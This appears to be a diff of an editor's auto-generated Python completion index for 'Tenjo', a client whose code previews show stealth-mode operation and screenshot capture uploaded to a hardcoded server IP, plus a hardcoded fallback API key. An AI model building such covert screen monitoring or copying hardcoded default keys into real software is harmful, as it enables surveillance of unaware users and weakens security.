@@ -92,6 +92,22 @@
         "documentation": {}
     },
     {
+        "label": "datetime",
+        "importPath": "datetime",
+        "description": "datetime",
+        "isExtraImport": true,
+        "detail": "datetime",
+        "documentation": {}
+    },
+    {
+        "label": "datetime",
+        "importPath": "datetime",
+        "description": "datetime",
+        "isExtraImport": true,
+        "detail": "datetime",
+        "documentation": {}
+    },
+    {
         "label": "time",
         "kind": 6,
         "isExtraImport": true,
@@ -134,6 +150,14 @@
         "importPath": "psutil",
         "description": "psutil",
         "detail": "psutil",
+        "documentation": {}
+    },
+    {
+        "label": "Config",
+        "importPath": "core.config",
+        "description": "core.config",
+        "isExtraImport": true,
+        "detail": "core.config",
         "documentation": {}
     },
     {
@@ -312,6 +336,22 @@
         "documentation": {}
     },
     {
+        "label": "APIClient",
+        "importPath": "utils.api_client",
+        "description": "utils.api_client",
+        "isExtraImport": true,
+        "detail": "utils.api_client",
+        "documentation": {}
+    },
+    {
+        "label": "ScreenCapture",
+        "importPath": "modules.screen_capture",
+        "description": "modules.screen_capture",
+        "isExtraImport": true,
+        "detail": "modules.screen_capture",
+        "documentation": {}
+    },
+    {
         "label": "lexers",
         "importPath": "sphinx.highlighting",
         "description": "sphinx.highlighting",
@@ -332,7 +372,7 @@
         "kind": 6,
         "importPath": "client.src.core.config",
         "description": "client.src.core.config",
-        "peekOfCode": "class Config:\n    # Server Configuration\n    SERVER_URL = \"http://103.129.149.67\"\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    # Client Identification - Dynamic generation based on hardware\n    @staticmethod\n    def generate_client_id():\n        \"\"\"Generate unique client ID based on hardware\"\"\"\n        import hashlib\n        # Get unique identifiers",
+        "peekOfCode": "class Config:\n    # Server Configuration\n    SERVER_URL = os.getenv('TENJO_SERVER_URL', \"http://103.129.149.67\")\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    API_KEY = os.getenv('TENJO_API_KEY', \"default-api-key-2024\")\n    # Client Identification - Dynamic generation based on hardware\n    @staticmethod\n    def generate_client_id():\n        \"\"\"Generate unique client ID based on hardware\"\"\"\n        import hashlib",
         "detail": "client.src.core.config",
         "documentation": {}
     },
@@ -409,6 +449,69 @@
         "documentation": {}
     },
     {
+        "label": "setup_logging",
+        "kind": 2,
+        "importPath": "client.fix_production",
+        "description": "client.fix_production",
+        "peekOfCode": "def setup_logging():\n    \"\"\"Setup logging\"\"\"\n    logging.basicConfig(\n        level=logging.INFO,\n        format='%(asctime)s - %(levelname)s - %(message)s',\n        handlers=[\n            logging.StreamHandler(sys.stdout),\n            logging.FileHandler('production_fix.log')\n        ]\n    )",
+        "detail": "client.fix_production",
+        "documentation": {}
+    },
+    {
+        "label": "fix_config_issues",
+        "kind": 2,
+        "importPath": "client.fix_production",
+        "description": "client.fix_production",
+        "peekOfCode": "def fix_config_issues():\n    \"\"\"Fix configuration issues\"\"\"\n    print(\"🔧 Fixing Configuration Issues...\")\n    config_file = os.path.join('src', 'core', 'config.py')\n    if not os.path.exists(config_file):\n        print(\"❌ Config file not found!\")\n        return False\n    try:\n        # Read current config\n        with open(config_file, 'r') as f:",
+        "detail": "client.fix_production",
+        "documentation": {}
+    },
+    {
+        "label": "fix_api_client_issues",
+        "kind": 2,
+        "importPath": "client.fix_production",
+        "description": "client.fix_production",
+        "peekOfCode": "def fix_api_client_issues():\n    \"\"\"Fix API client issues\"\"\"\n    print(\"\\n🔧 Fixing API Client Issues...\")\n    api_file = os.path.join('src', 'utils', 'api_client.py')\n    if not os.path.exists(api_file):\n        print(\"❌ API client file not found!\")\n        return False\n    try:\n        with open(api_file, 'r') as f:\n            content = f.read()",
+        "detail": "client.fix_production",
+        "documentation": {}
+    },
+    {
+        "label": "validate_dependencies",
+        "kind": 2,
+        "importPath": "client.fix_production",
+        "description": "client.fix_production",
+        "peekOfCode": "def validate_dependencies():\n    \"\"\"Validate required dependencies\"\"\"\n    print(\"\\n🔍 Validating Dependencies...\")\n    required_packages = [\n        'requests',\n        'mss', \n        'psutil',\n        'PIL'\n    ]\n    missing_packages = []",
+        "detail": "client.fix_production",
+        "documentation": {}
+    },
+    {
+        "label": "create_production_env",
+        "kind": 2,
+        "importPath": "client.fix_production",
+        "description": "client.fix_production",
+        "peekOfCode": "def create_production_env():\n    \"\"\"Create production environment file\"\"\"\n    print(\"\\n📝 Creating Production Environment...\")\n    env_content = f\"\"\"# Tenjo Client Production Environment\n# Generated: {datetime.now().isoformat()}\n# Server Configuration\nTENJO_SERVER_URL=http://103.129.149.67\nTENJO_API_KEY={Config.CLIENT_ID if 'Config' in globals() else 'auto-generated'}\n# Monitoring Settings\nTENJO_SCREENSHOT_INTERVAL=60",
+        "detail": "client.fix_production",
+        "documentation": {}
+    },
+    {
+        "label": "test_production_connection",
+        "kind": 2,
+        "importPath": "client.fix_production",
+        "description": "client.fix_production",
+        "peekOfCode": "def test_production_connection():\n    \"\"\"Test connection to production server\"\"\"\n    print(\"\\n🌐 Testing Production Connection...\")\n    try:\n        # Add src to path\n        sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))\n        from core.config import Config\n        from utils.api_client import APIClient\n        api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        print(f\"🎯 Testing connection to: {Config.SERVER_URL}\")",
+        "detail": "client.fix_production",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "client.fix_production",
+        "description": "client.fix_production",
+        "peekOfCode": "def main():\n    \"\"\"Run production fixes\"\"\"\n    setup_logging()\n    print(\"🚀 Tenjo Production Fix Script\")\n    print(\"=\" * 50)\n    print(f\"⏰ Fix Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\")\n    print(\"=\" * 50)\n    fixes = [\n        (\"Configuration Issues\", fix_config_issues),\n        (\"API Client Issues\", fix_api_client_issues),",
+        "detail": "client.fix_production",
+        "documentation": {}
+    },
+    {
         "label": "TenjoClient",
         "kind": 6,
         "importPath": "client.main",
@@ -442,6 +545,51 @@
         "description": "client.main",
         "peekOfCode": "shutdown_flag = False\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    logging.info(f\"Received signal {signum}, initiating graceful shutdown...\")\n    shutdown_flag = True\nclass TenjoClient:\n    def __init__(self, stealth_mode=True):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)",
         "detail": "client.main",
+        "documentation": {}
+    },
+    {
+        "label": "setup_logging",
+        "kind": 2,
+        "importPath": "client.production_test",
+        "description": "client.production_test",
+        "peekOfCode": "def setup_logging():\n    \"\"\"Setup logging for testing\"\"\"\n    logging.basicConfig(\n        level=logging.INFO,\n        format='%(asctime)s - %(levelname)s - %(message)s',\n        handlers=[\n            logging.StreamHandler(sys.stdout),\n            logging.FileHandler('production_test.log')\n        ]\n    )",
+        "detail": "client.production_test",
+        "documentation": {}
+    },
+    {
+        "label": "test_client_registration",
+        "kind": 2,
+        "importPath": "client.production_test",
+        "description": "client.production_test",
+        "peekOfCode": "def test_client_registration():\n    \"\"\"Test client registration with production server\"\"\"\n    print(\"🔧 Testing Client Registration...\")\n    try:\n        api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        # Prepare client info\n        import socket\n        import platform\n        client_info = {\n            'client_id': Config.CLIENT_ID,",
+        "detail": "client.production_test",
+        "documentation": {}
+    },
+    {
+        "label": "test_screenshot_upload",
+        "kind": 2,
+        "importPath": "client.production_test",
+        "description": "client.production_test",
+        "peekOfCode": "def test_screenshot_upload():\n    \"\"\"Test screenshot capture and upload\"\"\"\n    print(\"\\n📸 Testing Screenshot Upload...\")\n    try:\n        api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        screen_capture = ScreenCapture(api_client)\n        print(\"📷 Capturing screenshot...\")\n        result = screen_capture.capture_and_upload()\n        if result and result.get('success'):\n            print(\"✅ Screenshot upload successful!\")",
+        "detail": "client.production_test",
+        "documentation": {}
+    },
+    {
+        "label": "test_api_connectivity",
+        "kind": 2,
+        "importPath": "client.production_test",
+        "description": "client.production_test",
+        "peekOfCode": "def test_api_connectivity():\n    \"\"\"Test basic API connectivity\"\"\"\n    print(\"🌐 Testing API Connectivity...\")\n    try:\n        api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        # Test health endpoint\n        response = api_client.get('/api/health')\n        if response:\n            print(\"✅ API connectivity successful!\")\n            print(f\"📝 Health check response: {response}\")",
+        "detail": "client.production_test",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "client.production_test",
+        "description": "client.production_test",
+        "peekOfCode": "def main():\n    \"\"\"Run all production tests\"\"\"\n    setup_logging()\n    print(\"🚀 Tenjo Production Test Suite\")\n    print(\"=\" * 50)\n    print(f\"🎯 Target Server: {Config.SERVER_URL}\")\n    print(f\"🆔 Client ID: {Config.CLIENT_ID[:8]}...\")\n    print(f\"⏰ Test Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\")\n    print(\"=\" * 50)\n    tests = [",
+        "detail": "client.production_test",
         "documentation": {}
     },
     {
